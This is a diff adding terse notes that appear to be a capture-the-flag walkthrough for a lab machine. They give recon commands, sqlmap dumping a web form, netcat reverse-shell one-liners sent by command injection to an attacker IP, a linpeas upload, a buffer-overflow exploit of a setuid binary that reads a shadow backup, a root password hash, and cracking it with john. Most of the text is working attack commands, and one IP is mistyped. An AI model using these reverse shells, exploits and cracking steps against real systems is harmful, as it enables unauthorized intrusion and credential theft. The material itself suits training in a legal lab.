@@ -1,0 +1,122 @@
+### reference to exploitation: https://www.youtube.com/watch?v=AdxwHwuLaIg		###
+
+###							recon						###
+
+sudo nmap -p1-1000 -sC -v -sV -v -A -oN > nmapAgress.txt
+
+
+###							website - enum				###
+
+sudo gobuster -u http://10.10.120.17/ -w /usr/share/dirb/wordlists/big.txt -x php,txt.html > gob2.txt
+
+
+							website - exploit			###
+
+sqlmap -u http://10.10.120.17/administrator.php --forms --dump --batch
+
+
+###							reverse shell    			###
+
+### http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+### listener 
+
+nc -nvlp 9001
+
+ifconfig tun0
+
+### on website - command injection 
+
+nc -e /bin/sh 110.2.26.235 9001
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.26.235 9001 >/tmp/f
+
+### back to listener
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+### get ssh pass
+
+cd .. && ls -la && cd hidden && cat pass
+
+
+
+###							LinEum						###
+
+scp /opt/gitty/linpeas/linPEAS/linpeas.sh pingu@10.10.120.17:/tmp
+
+
+###			Post Web Exploitation - Pre PrivEsc Exploitation			###
+
+-----------------------------------------------------------------------------------
+
+										### binary source - just to know 
+
+										#include "unistd.h"
+										#include "stdio.h"
+										#include "stdlib.h"
+										void shell(){
+										setuid(1000);
+										setgid(1000);
+										system("cat /var/backups/shadow.bak");
+										}
+
+										void get_input(){
+										char buffer[32];
+										scanf("%s",buffer);
+										}
+
+										int main(){
+										get_input();
+										}
+
+-------------------------------------------------------------------------------------
+
+### connect to machine
+
+ssh pingu@10.10.120.17 
+
+cd /opt/secret
+
+readelf -s root
+
+
+### able to see:
+
+71: 080484cb    57 FUNC    GLOBAL DEFAULT   14 shell
+### 
+
+gdb ./root
+
+### entering pwndbg
+
+r < <(cyclic 50)
+
+### take note of  [ ► f 0 6161616c ]
+
+### stop pwndbg
+
+quit
+
+### sart overwrite for EIP
+
+cyclic -l 0x6161616c
+
+### Running cyclic outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.
+
+
+
+
+### 						PrivEsc Exploitation 			###
+
+### generate payload - bash
+
+python -c 'import struct; print("A"*44+struct.pack("<I",0x080484cb))' | ./root
+
+### ^ gives file content
+
+### now crack root passwd hash:
+
+### $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
+
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt roothash.txt >> crack.txt 
